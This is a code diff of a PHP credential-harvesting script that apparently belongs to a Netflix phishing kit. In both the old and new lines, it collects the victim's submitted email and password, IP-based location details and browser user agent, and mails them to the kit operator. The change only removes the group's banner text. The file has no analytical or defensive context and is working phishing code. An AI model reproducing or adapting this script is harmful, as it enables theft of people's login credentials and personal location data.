@@ -56,13 +56,13 @@ $headers = "From: GcS-Team<info@GcSTeam.com>";
 $send = $email; 
 
 
-$message = "[GcS Team🇩🇿][+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+][GcS Team🇩🇿]\r\n";
-$message .= "|Email      : ".$_POST['userLoginId']."\r\n";
-$message .= "|Password      	 : ".$_POST['password']."\r\n";
-$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
+$message = "【🔥 NetFlix Fire 🔥】\r\n";
+$message .= "Email      : ".$_POST['userLoginId']."\r\n";
+$message .= "Password      	 : ".$_POST['password']."\r\n";
+$message .= "【💻 System INFO】\r\n";
 $message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
 $message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
-$message .= "[GcS Team🇩🇿][+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+][GcS Team🇩🇿]\n";
+$message .= "【🔥 NetFlix Fire 🔥】\n";
 
 mail($send,$subject,$message,$headers);
 
